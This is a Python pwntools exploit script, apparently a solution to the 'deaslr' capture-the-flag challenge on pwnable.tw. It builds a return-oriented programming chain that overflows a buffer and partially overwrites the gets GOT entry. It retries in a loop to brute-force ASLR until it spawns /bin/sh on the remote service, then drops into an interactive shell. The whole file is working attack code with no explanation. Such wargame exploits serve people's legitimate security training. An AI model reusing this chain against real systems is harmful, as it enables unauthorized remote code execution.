#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./deaslr')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x0000000000400554
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10402)

	return s

elf = ELF('deaslr')
libc = ELF('libc_64.so.6')

pop_rdi = 0x4005c3
bss = 0x601000
pop_6 = 0x4005ba
ret = 0x4003f9
offset = 0xfffffffffffd6610

payload = b'A' * 0x18 + p64(pop_rdi) + p64(bss) + p64(elf.symbols['gets'])
payload += p64(pop_6) + p64(elf.got['gets'] - 0x10) + p64(0) * 4 + p64(bss)
payload += p64(pop_rdi) + p64(bss + 8) + p64(ret) * 6 + b'\xb0'

while True:
	try:
		s = conn()

		s.sendline(payload)
		s.sendline(p64(offset) + b'/bin/sh')

		s.clean()
		s.sendline(b'ls')
		s.recv(timeout = 1)

		break
	except:
		s.close()

s.interactive()
